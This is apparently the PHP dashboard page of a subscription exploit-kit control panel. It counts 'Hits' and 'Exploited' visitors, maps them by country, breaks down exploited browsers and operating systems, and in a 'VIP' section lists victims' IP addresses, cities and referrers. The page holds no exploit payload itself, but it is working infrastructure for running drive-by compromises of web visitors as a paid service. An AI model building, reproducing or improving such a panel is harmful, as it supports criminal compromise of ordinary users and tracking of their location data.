<?php
require_once('inc/config.php');
?>
<?php 
if (isset($_SESSION['admin']) and $_SESSION['admin'] == true) {
    header('Location: admin.php');
    die();
} elseif (!isset($_SESSION['logged']) or $_SESSION['logged'] != true) {
    header('Location: login.php');
    die();
}
?>
<?php $title = 'Home' ?>
<?php 
require_once('inc/functions/user.php'); 
$exp = subscription_expire();
?>
<?php if (is_post() && check_token($_POST['token'])) {
    switch ($_POST['action']) {
    case 'clear_stats':
        clear_stats();
    break;
    }
}
?>
<?php require_once('inc/header.php') ?>
<?php require_once('inc/hnav.php') ?>
<?php require_once('inc/lnav.php') ?>
<script type="text/javascript">
    var morrisPie = function() {

        Morris.Donut({
            element: 'browser-donut',
            data: [

            <?php morris_browser_donut() ?>

            ],
            colors: [
                '#1abc9c',
                '#293949',
                '#e84c3d',
                '#3598db',
                '#2dcc70',
                '#f1c40f'
            ]
        });
    }
</script>
<script src="static/plugins/ammap/ammap.js" type="text/javascript"></script>
<script src="static/plugins/ammap/worldLow.js" type="text/javascript"></script>
<script type="text/javascript">
            AmCharts.makeChart("mapdiv", {
                type: "map",

                colorSteps: 10,

                dataProvider: {
                    map: "worldLow",
                    areas: [
                    <?php show_map() ?>
                    ]
                },

                areasSettings: {
                    autoZoom: true
                },

                valueLegend: {
                    right: 10,
                    minValue: "Low value",
                    maxValue: "High value"
                }

            });
        </script>
        <!--main content start-->
        <section class="main-content-wrapper">
            <section id="main-content">
                <!--tiles start-->
                <div class="row">
                    <div class="col-md-3 col-sm-6">
                        <div class="dashboard-tile detail tile-red">
                            <div class="content">
                                <h1 class="text-left timer" data-from="0" data-to="<?php echo hits() ?>" data-speed="2500"> </h1>
                                <p>Hits</p>
                            </div>
                            <div class="icon"><i class="fa fa-users"></i>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-3 col-sm-6">
                        <div class="dashboard-tile detail tile-turquoise">
                            <div class="content">
                                <h1 class="text-left timer" data-from="0" data-to="<?php echo rate() ?>" data-speed="2500"> </h1>
                                <p>Exploited</p>
                            </div>
                            <div class="icon"><i class="fa fa-bug"></i>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-3 col-sm-6">
                        <div class="dashboard-tile detail tile-blue">
                            <div class="content">
                                <h1 class="text-left timer" data-from="0" data-to="<?php echo threads() ?>" data-speed="2500"> </h1>
                                <p>Threads</p>
                            </div>
                            <div class="icon"><i class="fa fa-random"></i>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-3 col-sm-6">
                        <div class="dashboard-tile detail tile-purple">
                            <div class="content">
                                <h1 class="text-left timer" data-to="<?php echo rate_percentage() ?>" data-speed="2500"> </h1>
                                <p>Rate %</p>
                            </div>
                            <div class="icon"><i class="fa fa-line-chart"></i>
                            </div>
                        </div>
                    </div>
                </div>
                <!--tiles end-->
                <!--dashboard charts and map start-->
                <div class="row">
                    <div class="col-md-12">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Heatmap</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                <div id="mapdiv" style="width: 100%; background-color:#EEEEEE; height: 500px;"></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-md-6">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Countries</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                <table class="table">
                                  <thead>
                                    <tr>
                                      <th>#</th>
                                      <th>Country</th>
                                      <th>Hits</th>
                                    </tr>
                                  </thead>
                                  <tbody>
                                    <?php countries() ?>
                                  </tbody>
                                </table>
                          </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Browsers</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                <div id="browser-donut"></div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-md-6">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Last 200 OS Hits</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                <table id="oshitslist" class="table table-striped table-bordered" cellspacing="0" width="100%">
                                    <thead>
                                        <tr>
                                            <th>OS</th>
                                            <th>hits</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php hits_field('os',false) ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Last 200 OS Exploted</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                <table id="exphitslist" class="table table-striped table-bordered" cellspacing="0" width="100%">
                                    <thead>
                                        <tr>
                                            <th>OS</th>
                                            <th>Exploited</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php hits_field('os',true) ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-md-6">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Last 200 Hits</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                <table id="hitslistgrouped" class="table table-striped table-bordered" cellspacing="0" width="100%">
                                    <thead>
                                        <tr>
                                            <th>Browser</th>
                                            <th>hits</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php hits_grouped(false) ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Last 200 Exploited</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                <table id="exploitedlistgrouped" class="table table-striped table-bordered" cellspacing="0" width="100%">
                                    <thead>
                                        <tr>
                                            <th>Browser</th>
                                            <th>hits</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php hits_grouped(true) ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>

                <?php
                // start VIP
                if (isset($vip) && $vip===true) {
                ?>
                <div class="row">
                    <div class="col-md-12">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Last 200 Hits</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                <table id="hitslist" class="table table-striped table-bordered" cellspacing="0" width="100%">
                                    <thead>
                                        <tr>
                                            <th>IP</th>
                                            <th>Country</th>
                                            <th>City</th>
                                            <th>Browser</th>
                                            <th>Referrer</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php list_hits() ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-md-12">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Last 200 Exploited</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                <table id="exploitedlist" class="table table-striped table-bordered" cellspacing="0" width="100%">
                                    <thead>
                                        <tr>
                                            <th>IP</th>
                                            <th>Country</th>
                                            <th>City</th>
                                            <th>Browser</th>
                                            <th>Referrer</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php list_exploited() ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
                <?php
                }
                // end VIP
                ?>

                <div class="row">
                    <div class="col-md-6">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Last 200 Referrer Hits</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                <table id="refhitslist" class="table table-striped table-bordered" cellspacing="0" width="100%">
                                    <thead>
                                        <tr>
                                            <th>Ref</th>
                                            <th>hits</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php hits_field('ref') ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Clear data</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                <form role="form" method="post" action="">
                                    <input type="hidden" name="action" value="clear_stats" />
                                    <input type="hidden" name="token" value="<?php echo $_SESSION['csrf'] ?>" />
                                    <button type="submit" class="btn btn-primary">Clear stats</button>
                                </form>
                          </div>
                        </div>
                    </div>
                </div>
            </section>
        </section>
    
</div>
    <!--main content end-->
    <!--Global JS-->
    <script src="static/js/jquery-1.10.2.min.js"></script>
    <script src="static/js/bootstrap.min.js"></script>
    <script src="static/plugins/navgoco/jquery.navgoco.min.js"></script>
    <script src="static/plugins/waypoints/waypoints.min.js"></script>
    <script src="static/plugins/switchery/switchery.min.js"></script>
    <script src="static/js/application.js"></script>
    <!--Page Level JS-->
    <script src="static/plugins/countTo/jquery.countTo.js"></script>
    <script src="static/plugins/weather/js/skycons.js"></script>
    <script src="static/plugins/dataTables/js/jquery.dataTables.js"></script>
    <script src="static/plugins/dataTables/js/dataTables.bootstrap.js"></script>
    <script src="static/plugins/morris/js/morris.min.js"></script>
    <script src="static/plugins/morris/js/raphael.2.1.0.min.js"></script>
    <!--Load these page level functions-->
    <script>
    $(document).ready(function() {
        app.timer();
        //$('#hitslistgrouped').dataTable();
        //$('#exploitedlistgrouped').dataTable();
        app.morrisPie();
    });
    </script>

</body>

</html>

<?php #include('gzip_stop.php'); ?>
